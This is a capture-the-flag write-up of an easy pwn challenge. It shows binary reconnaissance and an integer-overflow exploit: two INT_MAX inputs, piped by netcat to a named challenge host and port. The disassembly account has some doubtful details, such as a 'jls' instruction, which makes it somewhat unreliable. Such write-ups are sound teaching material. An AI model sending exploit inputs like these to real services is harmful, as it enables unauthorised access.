# Riddle - Pwn Writeup

**Challenge Category:** Pwn (Binary Exploitation)  
**Difficulty:** Easy-Medium  
**Time Spent:** ~30 minutes  
**Docker Instance:** 154.57.164.73:31387

## Overview

This challenge presented a Docker-hosted binary with what seemed like a simple logic puzzle. The riddle was mathematically impossible with real numbers, but when dealing with computer integer arithmetic, the impossible becomes possible. This is a classic signed integer overflow challenge.

## The Riddle

The prompt asks:
```
"It's riddle time! Enter 2 numbers where n1, n2 > 0 and n1 + n2 < 0"
```

With real numbers, this is impossible. Two positive numbers always sum to a positive result. But with 32-bit signed integers? That's where it gets interesting.

## Initial Reconnaissance

### Step 1: Inventory the Binary

I started by listing the binary's contents without extraction:
- Found an ELF binary called `riddle`
- Found a `flag.txt` placeholder (the real flag is on the server)
- Found a `glibc/` folder with specific library versions

This told me two things:
1. The challenge is tied to a specific libc version (matters for exploit stability)
2. The binary is standalone and should be straightforward to analyze

### Step 2: Profile the Binary

```bash
file riddle
# riddle: ELF 64-bit LSB executable, x86-64, dynamically linked
```

Running `readelf`:
- 64-bit ELF ✓
- Dynamically linked ✓
- **Not stripped** - symbol table is preserved! This is huge for reverse engineering

### Step 3: Check Security Mitigations

Using `readelf` to check protections:
- **PIE enabled** - addresses randomized at load time
- **Stack canary** - `__stack_chk_fail` imported
- **Full RELRO** - GOT is read-only
- **NX bit** - stack is not executable

This told me: "This is probably not a straightforward buffer overflow or shellcode challenge."

### Step 4: Symbol Analysis

The symbol table revealed key functions:
- `main` - entry point
- `menu` - probably a menu function
- `read_flag` - our goal!
- `read_num` - parses numeric input
- `banner` - displays title
- `scanf` and `strout` - for I/O

Notably, `read_flag` exists as a standalone function, suggesting the goal is to trigger it.

### Step 5: Extract Useful Strings

```bash
strings riddle | grep -i "riddle\|enter\|number"
```

Output:
```
"It's riddle time! Enter 2 numbers where n1, n2 > 0 and n1 + n2 < 0"
```

This is the entire puzzle in text form.

### Step 6: Disassemble the Logic

Using `objdump -d riddle | grep -A 20 main`:

Critical observations:
1. **Variables are DWORD** (32-bit) - not 64-bit
2. **Comparison uses `jls` (jump if less signed)** - treats inputs as signed 32-bit integers
3. The check logic:
   ```
   if (n1 <= 0) exit;
   if (n2 <= 0) exit;
   if (n1 + n2 >= 0) exit;  // This is where the overflow happens!
   else call read_flag;
   ```

### Step 7: Understand the Exploit

A signed 32-bit integer ranges from **-2,147,483,648 to 2,147,483,647**.

The key insight:
```
n1 = 2,147,483,647  (INT_MAX, positive ✓)
n2 = 2,147,483,647  (INT_MAX, positive ✓)
n1 + n2 = 4,294,967,294
```

But in signed 32-bit arithmetic, this wraps around:
```
4,294,967,294 mod 2^32 = -2 (negative ✓)
```

The condition checks:
- `n1 > 0`? YES ✓
- `n2 > 0`? YES ✓  
- `n1 + n2 < 0`? YES ✓ (it's -2!)

All conditions pass! The CPU's signed overflow behavior is exactly what we need.

## Exploitation

### The Attack

```bash
# Run the binary interactively
./riddle
# When prompted:
# Input: 2147483647
# Input: 2147483647
# Output: Flag content!
```

Or via netcat:
```bash
(echo "2147483647"; echo "2147483647") | nc 154.57.164.73 31387
```

The CPU does the math, gets a negative result due to signed overflow, and the condition branch jumps to `read_flag`.

## The Smoking Gun

The `jls` instruction on the 32-bit add result is the vulnerability. The CPU's signed overflow behavior is exactly the "flaw" needed to pass the check.

## Lessons Learned

1. **Integer overflow is real:** Just because something seems impossible mathematically doesn't mean it's impossible in code
2. **Bit width matters:** 32-bit vs 64-bit, signed vs unsigned - these details are everything in low-level exploitation
3. **Signed arithmetic is subtle:** Especially when checking conditions after arithmetic operations
4. **Disassembly is your friend:** Understanding the actual CPU instructions reveals vulnerabilities that high-level code might hide
5. **The riddle is the vulnerability:** Sometimes the puzzle itself tells you exactly what's broken

## Key Takeaway

This challenge perfectly illustrates why competitive programming and systems programming need careful handling of integer types. What seems impossible at a mathematical level becomes possible when you account for hardware constraints and arithmetic behavior.

The "riddle" wasn't meant to be solved with mathematics - it was meant to be solved with understanding how computers actually perform arithmetic.

---

*Challenge completed during Global Ynov Partners CTF Challenge (Apr 18-19, 2026)*
